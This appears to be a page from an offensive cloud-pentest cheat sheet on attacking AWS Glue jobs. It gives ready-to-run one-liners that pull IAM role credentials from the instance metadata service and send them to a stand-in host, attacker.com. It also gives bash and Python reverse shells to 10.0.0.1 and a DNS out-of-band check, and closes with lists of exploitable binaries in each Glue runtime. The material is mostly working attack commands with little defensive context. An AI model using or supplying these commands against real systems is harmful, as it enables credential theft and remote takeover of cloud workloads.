# Glue

Glue jobs are typically used for Extract, Transform, Load (ETL) operations or batch processing. They can have a service role associated with them, which may enable certain AWS permissions if compromised.

Jobs run by default with a longer execution window than Lambda functions, which increases the opportunity time of a reverse shell payload.

Additionally the environments used for Glue jobs have more common system packages than Lambda. For example, the `requests` library exists in the `python3` deployment packages across all Glue jobs.

## Generic

### DNS

```
python3 -c 'import socket;socket.gethostbyname("attacker.com")'
```

### OOB HTTP Request

```
curl https://attacker.com -d $(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy)
```

```
python3 -c 'import requests;requests.post("https://attacker.com/data",json=requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy").json())'
```

* Note that for Ray jobs that the IMDS endpoint is slightly different: `http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role`

### Reverse Shell

```
bash -i >& /dev/tcp/10.0.0.1/80 0>&1
```

```
python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Python Shell (Glue 4.0)

Runs Debian GNU/Linux 10 (buster)

Interesting Binaries: apt, c89, c99, cc, curl, g++, gcc, git, gpg, openssl, perl, python2, python3, scp, ssh, svn, wget

## Spark (Python 3 and Scala; Glue 4.0)

Runs Amazon Linux 2

Interesting Binaries: aws, c++, c89, c99, cc, curl, g++, gcc, gdb, git, gpg2, java, lua, perl, python, python3, scp, sftp, sqlite3, ssh, svn, wget, yum

## Ray (Glue 4.0)

Runs Amazon Linux 2

Interesting Binaries: aws, c++, c89, c99, cc, curl, g++, gcc, gdb2, java, jconsole, jrunscript, lua, ncat, ping, pip3, python, python3, urlgrabber, yum
